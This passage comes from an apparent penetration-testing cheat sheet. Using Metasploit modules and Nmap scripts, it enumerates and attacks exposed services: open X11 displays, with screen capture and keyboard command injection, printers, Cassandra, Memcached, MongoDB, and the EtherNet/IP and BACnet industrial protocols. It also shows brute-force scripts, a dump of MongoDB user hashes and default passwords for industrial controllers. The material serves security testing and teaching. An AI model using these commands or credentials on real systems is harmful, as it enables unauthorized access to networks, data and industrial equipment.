default screen number:    0
number of screens:    1

screen #0:
  dimensions:    1024x768 pixels (347x260 millimeters)
  resolution:    75x75 dots per inch
  depths (6):    16, 1, 4, 8, 15, 24
  root window id:    0x25
  depth of root window:    16 planes
  number of colormaps:    minimum 1, maximum 1
  default colormap:    0x20
  default number of colormap cells:    64
  preallocated pixels:    black 0, white 65535
  options:    backing-store NO, save-unders NO
  largest cursor:    32x32
  current input event mask:    0x0
  number of visuals:    2
  default visual id:  0x21
  visual:
    visual id:    0x21
    class:    TrueColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0xf800, 0x7e0, 0x1f
    significant bits in color specification:    6 bits
  visual:
    visual id:    0x22
    class:    DirectColor
    depth:    16 planes
    available colormap entries:    64 per subfield
    red, green, blue masks:    0xf800, 0x7e0, 0x1f
    significant bits in color specification:    6 bits
```

To take the <strong>screenshot</strong> use:
```
xwd -root -display 10.20.xx.xx:0 -out xdump.xdump
display xdump.xdump
```
<strong>live viewing</strong>: 
First we need to find the ID of the window using xwininfo
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

  Absolute upper-left X:  0
  Absolute upper-left Y:  0
  Relative upper-left X:  0
  Relative upper-left Y:  0
  Width: 1024
  Height: 768
  Depth: 16
  Visual: 0x21
  Visual Class: TrueColor
  Border width: 0
  Class: InputOutput
  Colormap: 0x20 (installed)
  Bit Gravity State: ForgetGravity
  Window Gravity State: NorthWestGravity
  Backing Store State: NotUseful
  Save Under State: no
  Map State: IsViewable
  Override Redirect State: no
  Corners:  +0+0  -0+0  -0-0  +0-0
  -geometry 1024x768+0+0
```

For <strong>live viewing</strong> we need to use 
```
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
</li>
<li> We can also do <strong>X11 Keyboard Command Injection</strong> 
```
use exploit/unix/x11/x11_keyboard_exec
```

For more information: Refer: <a href="http://rageweb.info/2014/05/04/open-x11-server/">Open-x11-server</a> 
</li>
</ol>

###PJL | Port 9100
There are multiple modules in the metasploit for PJL.
```
   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   auxiliary/scanner/printer/printer_delete_file                     normal  Printer File Deletion Scanner
   auxiliary/scanner/printer/printer_download_file                   normal  Printer File Download Scanner
   auxiliary/scanner/printer/printer_env_vars                        normal  Printer Environment Variables Scanner
   auxiliary/scanner/printer/printer_list_dir                        normal  Printer Directory Listing Scanner
   auxiliary/scanner/printer/printer_list_volumes                    normal  Printer Volume Listing Scanner
   auxiliary/scanner/printer/printer_ready_message                   normal  Printer Ready Message Scanner
   auxiliary/scanner/printer/printer_upload_file                     normal  Printer File Upload Scanner
   auxiliary/scanner/printer/printer_version_info                    normal  Printer Version Information Scanner
   auxiliary/server/capture/printjob_capture                         normal  Printjob Capture Service
```
As of now, We only got a chance to use 
<ol>
<li><strong>Printer Version Information Scanner</strong> which scans for printer version information using the Printer Job Language (PJL) protocol.
```
use auxiliary/scanner/printer/printer_version_info
```
Sample Output:
```
[+] 10.10.xx.xx:9100 - HP LaserJet M1522nf MFP
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
</li>
</ol>

<strong>Nmap</strong> also one NSE which is 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/pjl-ready-message.html">PJL-ready-message</a> It retrieves or sets the ready message on printers that support the Printer Job Language. This includes most PostScript printers that listen on port 9100. Without an argument, displays the current ready message. With the pjl_ready_message script argument, displays the old ready message and changes it to the message given.

Sample Output:
```
nmap --script=pjl-ready-message.nse -n -p 9100 10.10.xx.xx

Nmap scan report for 10.10.xx.xx
Host is up (0.14s latency).
PORT     STATE SERVICE
9100/tcp open  jetdirect
|_pjl-ready-message: "Processing..."
```
</li>

</ol>

###Apache Cassandra | Port 9160

For Apache Cassandra, NMap has two nse script 

<ol>
<li>
<a href="https://nmap.org/nsedoc/scripts/cassandra-info.html">cassandra-info</a> which attempts to get basic info and server status from a Cassandra database.

Sample Output:
```
nmap -p 9160 10.10.xx.xx -n --script=cassandra-info

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-27 21:14 IST
Nmap scan report for 10.10.xx.xx
Host is up (0.16s latency).
PORT     STATE SERVICE
9160/tcp open  cassandra
| cassandra-info: 
|   Cluster name: Convoy
|_  Version: 19.20.0
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/cassandra-brute.html">cassandra-brute</a> which performs brute force password auditing against the Cassandra database.

Sample Output:
```
nmap -p 9160 122.166.xx.xx -n --script=cassandra-brute

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-27 21:19 IST
Nmap scan report for 122.166.xx.xx
Host is up (0.083s latency).
PORT     STATE SERVICE
9160/tcp open  apani1
|_cassandra-brute: Any username and password would do, 'default' was used to test
```</li>
</ol>



###Network Data Management Protocol (ndmp) | Port 10000
<strong>Nmap NSE</strong> has
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ndmp-fs-info.html">ndmp-fs-info</a> can be used to list remote file systems
```
services -s ndmp -p 10000
services -p 10000 -s ndmp -o /tmp/ndmp.ports 
cat /tmp/ndmp.ports | cut -d , -f1 | tr -d \" | grep -v host > /tmp/ndmp.ports.2
```
Pass this to nmap
```
nmap -p 10000 --script ndmp-fs-info -n -iL /tmp/ndmp.ports.2
```
Sample Output:
```
| ndmp-fs-info: 
| FS       Logical device             Physical device
| NTFS     C:                         Device0000
| NTFS     D:                         Device0000
| NTFS     E:                         Device0000
| RMAN     Oracle-Win::\\TRDPLM\WIND  Device0000
| UNKNOWN  Shadow Copy Components     Device0000
|_UNKNOWN  System State               Device0000

```
</li>
<li><a href="https://nmap.org/nsedoc/scripts/ndmp-version.html">ndmp-version</a> : Retrieves version information from the remote Network Data Management Protocol (ndmp) service. NDMP is a protocol intended to transport data between a NAS device and the backup device, removing the need for the data to pass through the backup server. This nse although is not outputing the version correctly, however if we switch to --script-trace we do find the versions
```
00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00                 
00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.     
00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3     
00000060: 00 00 00 be 00 00 00 05 00 00 00 04                         

NSOCK INFO [5.0650s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 1122 [10.10.xx.xx:10000] (108 bytes)
NSE: TCP 10.10.xx.xx:40435 < 10.10.9.12:10000 | 00000000: 80 00 00 68 00 00 00 03 56 f1 64 e7 00 00 00 01    h    V d     
00000010: 00 00 01 08 00 00 00 02 00 00 00 00 00 00 00 00                 
00000020: 00 00 00 17 56 45 52 49 54 41 53 20 53 6f 66 74     VERITAS Soft
00000030: 77 61 72 65 2c 20 43 6f 72 70 2e 00 00 00 00 13 ware, Corp.     
00000040: 52 65 6d 6f 74 65 20 41 67 65 6e 74 20 66 6f 72 Remote Agent for
00000050: 20 4e 54 00 00 00 00 03 36 2e 33 00 00 00 00 03  NT     6.3  
```
</li>
</ol>

###Memcache | Port 11211
Memcached is a free & open source, high-performance, distributed memory object caching system.

There's a nmap script 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/memcached-info.html">memcached-info</a> : Retrieves information (including system architecture, process ID, and server time) from distributed memory object caching system memcached.
<br>
Sample Output:
```
nmap -p 11211 --script memcached-info 10.10.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-27 02:48 IST
Nmap scan report for email.xxxxxx.com (10.10.xx.xx)
Host is up (0.082s latency).
PORT      STATE SERVICE
11211/tcp open  unknown
| memcached-info: 
|   Process ID           4252
|   Uptime               1582276 seconds
|   Server time          2016-03-26T21:18:15
|   Architecture         64 bit
|   Used CPU (user)      25.881617
|   Used CPU (system)    17.413088
|   Current connections  14
|   Total connections    41
|   Maximum connections  1024
|   TCP Port             11211
|   UDP Port             11211
|_  Authentication       no

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```</li>
</ol>

We can also telnet to this port: Stats is one of the commands
```
telnet 10.10.xx.xx 11211
stats 
STAT pid 4252
STAT uptime 1582386
STAT time 1459027205
STAT version 1.4.10
STAT libevent 2.0.16-stable
STAT pointer_size 64
STAT rusage_user 25.889618
STAT rusage_system 17.417088
STAT curr_connections 14
STAT total_connections 42
STAT connection_structures 15
STAT reserved_fds 20
STAT cmd_get 3
STAT cmd_set 3
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 2
STAT get_misses 1
STAT delete_misses 0
STAT delete_hits 0
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 775
STAT bytes_written 26158
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 524288
STAT hash_is_expanding 0
STAT expired_unfetched 0
STAT evicted_unfetched 0
STAT bytes 87
STAT curr_items 1
STAT total_items 1
STAT evictions 0
STAT reclaimed 0
END
```

Sensepost has written a tool <a href="https://github.com/sensepost/go-derper">go-derper</a> and a article here <a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">blackhat-write-up-go-derper-and-mining-memcaches</a>  Blackhat slides here <a href="https://media.blackhat.com/bh-ad-10/Sensepost/BlackHat-AD-2010-Slaviero-Lifting-the-Fog-slides.pdf">BlackHat-AD-2010-Slaviero-Lifting-the-Fog-Slides</a>


###MongoDB | Port 27017 and Port 27018
<a href="https://github.com/all3g/exploit-exercises/tree/master/mongodb">mongodb</a> provides a good walkthru how to check for vulns in mongodb;

<strong>Metasploit</strong> has

<ol>
<li><strong>MongoDB Login Utility</strong>:   This module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication. This can be used to check if there is no-authentication on the MongoDB by setting blank_passwords to true. This can also be checked using the Nmap nse mongodb-brute
```
use auxiliary/scanner/mongodb/mongodb_login
```
Sample Output:
```
[*] Scanning IP: 10.169.xx.xx
[+] Mongo server 10.169.xx.xx dosn't use authentication
```
</li>
</ol>

<strong>Nmap</strong> has three NSEs for mongo db databases
<ol>
<li>Mongodb-info:

```
nmap 10.169.xx.xx -p 27017 -sV --script mongodb-info

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-26 02:23 IST
Nmap scan report for mongod.example.com (10.169.xx.xx)
Host is up (0.088s latency).
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 2.6.9 2.6.9
| mongodb-info: 
|   MongoDB Build info
|     OpenSSLVersion = 
|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-function -Wno-deprecated-declarations -fno-builtin-memcmp
|     loaderFlags = -fPIC -pthread -Wl,-z,now -rdynamic
|     version = 2.6.9
|     ok = 1
|     maxBsonObjectSize = 16777216
|     debug = false
|     bits = 64
|     javascriptEngine = V8
|     sysInfo = Linux build20.mongod.example.com 2.6.32-431.3.1.el6.x86_64 #1 SMP Fri Jan 3 21:39:27 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
|     versionArray
|       1 = 6
|       2 = 9
|       3 = 0
|       0 = 2
|     allocator = tcmalloc
|     gitVersion = df313bc75aa94d192330cb92756fc486ea604e64
|   Server status
|     opcounters
|       query = 19752
|       update = 1374
|       insert = 71735056
|       command = 78465013
|       delete = 121
|       getmore = 4156
|     connections
|       available = 795
|       totalCreated = 4487
|       current = 24
|     uptimeMillis = 3487298933
|     localTime = 1458938079849
|     metrics
|       getLastError
|         wtime
|           num = 0
|           totalMillis = 0
|     uptimeEstimate = 3455635
|     version = 2.6.9
|     uptime = 3487299
|     network
|       bytesOut = 17159001651
|       numRequests = 78517212
|       bytesIn = 73790966211
|     host = nvt-prod-05
|     mem
|       supported = true
|       virtual = 344
|       resident = 31
|       bits = 64
|     pid = 25964
|     extra_info
|       heap_usage_bytes = 2798848
|       page_faults = 16064
|       note = fields vary by platform
|     asserts
|       warning = 1
|       regular = 1
|       rollovers = 0
|       user = 11344
|       msg = 0
|     process = mongos
|_    ok = 1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
```
</li>

<li>Mongodb-database to find the databases in the mongodb.
```
nmap 122.169.xx.xx -p 27017 -sV --script mongodb-databases.nse

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-26 02:23 IST
Nmap scan report for mongod.example.com (10.169.xx.xx)
Host is up (0.090s latency).
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 2.6.9
| mongodb-databases: 
|   ok = 1
|   databases
|     1
|       shards
|         rs0 = 1
|       sizeOnDisk = 1
|       empty = true
|       name = test
|     0
|       shards
|         rs0 = 21415067648
|         rs1 = 17122197504
|       sizeOnDisk = 38537265152
|       empty = false
|       name = genprod
|     3
|       sizeOnDisk = 16777216
|       empty = false
|       name = admin
|     2
|       sizeOnDisk = 50331648
|       empty = false
|       name = config
|   totalSize = 38537265153
|_  totalSizeMb = 36752
```</li>

<li>Mongodb-BruteForce
```
nmap 10.169.xx.xx -p 27017 -sV --script mongodb-brute -n

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-26 02:28 IST
Nmap scan report for 122.169.xx.xx
Host is up (0.086s latency).
PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 2.6.9
|_mongodb-brute: No authentication needed
```

This database can be connected using
```
mongo 10.169.xx.xx
MongoDB shell version: 2.4.10
connecting to: 122.169.xx.xx/test
```
Show DBS can be used to see the current databases;
```
mongos> show dbs
admin	0.015625GB
config	0.046875GB
genprod	35.890625GB
test	(empty)
```
Use command can be used select the database
```
mongos> use admin
switched to db admin
```
Show collections can be used to see the tables;
```
mongos> show collections
nxae
system.indexes
system.users
system.version
```
db.foo.find()                list objects in collection foo
```
db.system.users.find()
{ "_id" : "test.root", "user" : "root", "db" : "test", "credentials" : { "MONGODB-CR" : "d6zzzdb4538zzz339acd585fa9zzzzzz" }, "roles" : [  {  "role" : "dbOwner",  "db" : "test" } ] }
{ "_id" : "genprod.root", "user" : "root", "db" : "genprod", "credentials" : { "MONGODB-CR" : "d6zzzdb4538zzz339acd585fa9zzzzzz" }, "roles" : [  {  "role" : "dbOwner",  "db" : "genprod" } ] }
```
</li>
</ol>

###EthernetIP-TCP-UDP | Port 44818 

If we found TCP Port 44818, probably it's running Ethernet/IP. Rockwell Automation / Allen Bradley developed the protocol and is the primary maker of these devices, e.g. ControlLogix and MicroLogix, but it is an open standard and a number of vendors offer an EtherNet/IP interface card or solution.

<a href="https://github.com/digitalbond/Redpoint">Redpoint</a> has released a NSE for enumeration of these devices

```
nmap -p 44818 -n --script enip-enumerate x.x.x.x -Pn

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-25 18:49 IST
Nmap scan report for x.x.x.x
Host is up (0.83s latency).
PORT      STATE SERVICE
44818/tcp open  EtherNet/IP
| enip-enumerate: 
|   Vendor: Rockwell Automation/Allen-Bradley (1)
|   Product Name: 1766-L32BXB B/10.00
|   Serial Number: 0x40605446
|   Device Type: Programmable Logic Controller (14)
|   Product Code: 90
|   Revision: 2.10
|_  Device IP: 192.168.xx.xx
```

Rockwell Automation has 
<ol>
<li>MicroLogix 1100: Default Username:password is administrator:ml1100</li>
<li>MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is <a href="http://literature.rockwellautomation.com/idc/groups/literature/documents/um/1766-um002_-en-p.pdf">MicroLogix 1400</a> </li>
<li>guest:guest is another default password.</li>
</ol>

### UDP BACNet | Port 47808

If we found UDP Port 47808 open, we can use BACnet-discover-enumerate NSE created by <a href="https://github.com/digitalbond/Redpoint">Redpoint</a>. Should read <a href="http://www.digitalbond.com/blog/2014/03/26/redpoint-discover-enumerate-bacnet-devices/">Discover Enumerate bacnet devices</a>

BACNet -- Port 47808
```
nmap -sU -p 47808 -n -vvv --script BACnet-discover-enumerate --script-args full=yes 182.X.X.X
Nmap scan report for 182.X.X.X
Host is up (0.11s latency).
PORT      STATE SERVICE
47808/udp open  BACNet -- Building Automation and Control Networks
| BACnet-discover-enumerate: 
|   Vendor ID: Automated Logic Corporation (24)
|   Vendor Name: Automated Logic Corporation
|   Object-identifier: 2404999
|   Firmware: BOOT(id=0,ver=0.01:001,crc=0x0000) MAIN(id=3,ver=6.00a:008,crc=0x2050) 
|   Application Software: PRG:carrier_19xrv_chiller_01_er_mv
|   Object Name: device2404999
|   Model Name: LGR1000
|   Description: Device Description
|   Location: Device Location
|   Broadcast Distribution Table (BDT): 
|     182.X.X.X:47808
|_  Foreign Device Table (FDT): Empty Table
```
